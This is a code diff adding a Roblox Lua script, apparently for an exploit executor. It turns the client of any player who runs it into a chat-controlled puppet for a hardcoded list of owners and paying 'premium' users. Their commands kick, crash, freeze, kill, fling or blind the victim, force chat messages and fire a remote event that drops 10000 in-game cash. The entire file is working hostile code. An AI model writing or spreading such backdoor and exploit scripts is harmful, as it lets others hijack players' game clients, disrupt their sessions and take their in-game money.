@@ -1,0 +1,254 @@
+-- SERVICES
+local Players = game:GetService("Players")
+local MarketplaceService = game:GetService("MarketplaceService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local ChatService = game:GetService("TextChatService")
+local RunService = game:GetService("RunService")
+local localPlayer = Players.LocalPlayer
+
+-- GAMEPASS ID
+local PREMIUM_PASS = 1618296323
+local BYPASS_PASS  = 1618124347
+
+-- OWNER LIST
+local owners = {
+    "anhchangm5",
+    "anhaycogihontoi",
+    "anhchangm53",
+    "dao_beo",
+    "anhchangm52",
+    "Itsnot_cool1",
+}
+
+local premiumUsers = {
+    "Fkgebder",  
+    "Newproarley",
+    "Bannanaman3160",
+    "s4b2xalt", 
+    "lIIJoaco",
+    "imtosigmaforyou98",
+}
+
+local premiumBypassUsers = {
+    "anhchangm5",
+    "Bannanaman3160",
+    "imtosigmaforyou98",
+}
+
+-- CACHE GAMEPASS
+local gamepassCache = {}
+
+-- Helper Functions
+local function isInTable(plr, tbl)
+    for _, name in ipairs(tbl) do
+        if plr.Name == name then return true end
+    end
+    return false
+end
+
+local function isOwner(plr)
+    return isInTable(plr, owners)
+end
+
+local function ownsPass(plr, id)
+    local key = plr.UserId .. "_" .. id
+    if gamepassCache[key] ~= nil then
+        return gamepassCache[key]
+    end
+    
+    local success, result = pcall(function()
+        return MarketplaceService:UserOwnsGamePassAsync(plr.UserId, id)
+    end)
+    
+    if success then
+        gamepassCache[key] = result
+        return result
+    end
+    return false
+end
+
+-- PERMISSION CHECK
+local function hasPermission(plr)
+    return isOwner(plr) 
+        or isInTable(plr, premiumUsers) 
+        or ownsPass(plr, PREMIUM_PASS)
+end
+
+local function isProtected(plr)
+    return isOwner(plr) 
+        or isInTable(plr, premiumBypassUsers) 
+        or ownsPass(plr, BYPASS_PASS)
+end
+
+-- UTILITY FUNCTIONS
+local function forceSay(msg)
+    local chan = ChatService:FindFirstChild("TextChannels") 
+        and ChatService.TextChannels:FindFirstChild("RBXGeneral")
+    if chan then 
+        pcall(function() chan:SendAsync(msg) end) 
+    end
+end
+
+local function bringTo(fromPlayer)
+    if localPlayer.Character and fromPlayer.Character 
+        and fromPlayer.Character:FindFirstChild("HumanoidRootPart") then
+        localPlayer.Character:PivotTo(fromPlayer.Character.HumanoidRootPart.CFrame)
+    end
+end
+
+local function setFreeze(state)
+    if not localPlayer.Character then return end
+    for _, part in ipairs({"LowerTorso","UpperTorso"}) do
+        local p = localPlayer.Character:FindFirstChild(part)
+        if p then p.Anchored = state end
+    end
+end
+
+local function resetPlayer()
+    local hum = localPlayer.Character 
+        and localPlayer.Character:FindFirstChildOfClass("Humanoid")
+    if hum then hum.Health = 0 end
+end
+
+local function dropCash()
+    local ev = ReplicatedStorage:FindFirstChild("MainEvent")
+    if ev then ev:FireServer("DropMoney", "10000") end
+end
+
+local function crashClient()
+    while true do end
+end
+
+local function blindClient()
+    if workspace.CurrentCamera then
+        workspace.CurrentCamera:Destroy()
+    end
+end
+
+local function fling()
+    if localPlayer.Character 
+        and localPlayer.Character:FindFirstChild("HumanoidRootPart") then
+        localPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0, 99999, 99999)
+    end
+end
+
+-- LEVENSHTEIN DISTANCE
+local function levenshtein(s, t)
+    local m, n = #s, #t
+    if m == 0 then return n end
+    if n == 0 then return m end
+    local d = {}
+    for i = 0, m do d[i] = {[0] = i} end
+    for j = 0, n do d[0][j] = j end
+    for i = 1, m do
+        for j = 1, n do
+            local cost = (s:sub(i,i) == t:sub(j,j)) and 0 or 1
+            d[i][j] = math.min(
+                d[i-1][j] + 1,
+                d[i][j-1] + 1,
+                d[i-1][j-1] + cost
+            )
+        end
+    end
+    return d[m][n]
+end
+
+local function findClosestPlayer(query)
+    query = string.lower(query)
+    local best, score = nil, math.huge
+    for _, plr in ipairs(Players:GetPlayers()) do
+        local u = string.lower(plr.Name)
+        local d = string.lower(plr.DisplayName)
+        if string.find(u, query, 1, true) or string.find(d, query, 1, true) then
+            return plr
+        end
+        local s = math.min(levenshtein(u, query), levenshtein(d, query))
+        if s < score then
+            score = s
+            best = plr
+        end
+    end
+    return best
+end
+
+-- ORBIT SYSTEM
+getgenv().orbit = false
+local orbitTarget
+RunService.Stepped:Connect(function()
+    if getgenv().orbit and orbitTarget and orbitTarget.Character 
+        and orbitTarget.Character:FindFirstChild("HumanoidRootPart") 
+        and localPlayer.Character then
+        local t = tick()
+        localPlayer.Character.HumanoidRootPart.CFrame =
+            orbitTarget.Character.HumanoidRootPart.CFrame
+            * CFrame.Angles(0, 2 * math.pi * t % (2 * math.pi), 0)
+            * CFrame.new(0, 0, 10)
+    end
+end)
+
+-- COMMAND HANDLER
+local function setupCommands(plr)
+    plr.Chatted:Connect(function(msg)
+        -- CHECK PERMISSION
+        if not hasPermission(plr) then return end
+
+        local args = string.split(msg, " ")
+        local cmd = string.lower(args[1] or "")
+
+        -- COMMANDS WITHOUT TARGET
+        if cmd == ".b" and args[2] == "all" then
+            bringTo(plr)
+            return
+        elseif cmd == ".sayall" then
+            forceSay(table.concat(args, " ", 2))
+            return
+        end
+
+        -- NEED TARGET
+        if not args[2] then return end
+        
+        local target = findClosestPlayer(args[2])
+        if not target or target ~= localPlayer then return end
+
+        -- PROTECTION CHECK
+        if isProtected(localPlayer) and not isOwner(plr) then
+            print("[BLOCKED]", plr.Name, "cannot control protected user")
+            return
+        end
+
+        -- EXECUTE COMMANDS
+        if cmd == ".k" or cmd == ".kick" then
+            localPlayer:Kick("Premium Has Kicked You")
+        elseif cmd == ".crash" then
+            crashClient()
+        elseif cmd == ".b" or cmd == ".bring" then
+            bringTo(plr)
+        elseif cmd == ".fr" or cmd == ".freeze" then
+            setFreeze(true)
+        elseif cmd == ".unfr" or cmd == ".unfreeze" then
+            setFreeze(false)
+        elseif cmd == ".reset" then
+            resetPlayer()
+        elseif cmd == ".dropcash" then
+            dropCash()
+        elseif cmd == ".say" then
+            forceSay(table.concat(args, " ", 3))
+        elseif cmd == ".blind" then
+            blindClient()
+        elseif cmd == ".fling" then
+            fling()
+        elseif cmd == ".o" then
+            orbitTarget = plr
+            getgenv().orbit = true
+        elseif cmd == ".uno" then
+            getgenv().orbit = false
+        end
+    end)
+end
+
+for _, p in ipairs(Players:GetPlayers()) do
+    setupCommands(p)
+end
+
+Players.PlayerAdded:Connect(setupCommands)
+
